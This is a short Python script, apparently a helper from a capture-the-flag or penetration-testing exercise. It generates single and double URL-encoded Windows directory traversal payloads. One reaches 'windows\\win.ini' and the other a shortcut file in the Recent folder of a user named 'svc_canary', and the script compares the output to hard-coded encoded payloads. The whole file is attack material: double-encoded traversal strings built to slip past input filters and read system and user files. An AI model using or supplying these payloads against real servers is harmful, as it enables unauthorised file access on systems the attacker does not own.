str="..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"

#1 
golden_seingle_encoded= "%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%77%69%6e%64%6f%77%73%5c%77%69%6e%2e%69%6e%69"
#2 
golden_double_encoded= "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%2577%2569%256e%2564%256f%2577%2573%255c%2577%2569%256e%252e%2569%256e%2569"
# without %
#codecs = str.encode().hex()

single_urlencode = ""
double_urlencode = ""
for i in range(len(str)):
    _hex = str[i].encode().hex()
    single_urlencode += "%" + _hex
    # only encode % to double encoding
    double_urlencode += "%25" + _hex
print("single_urlencode", single_urlencode, single_urlencode == golden_seingle_encoded)
print("double_urlencode", double_urlencode, double_urlencode == golden_double_encoded)

str2="..\\..\\..\\..\\..\\..\\users\\svc_canary\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\db.zip.lnk"

res = ""
for i in range(len(str2)):
    _hex = str2[i].encode().hex()
    res += "%25" + _hex
print("res", res)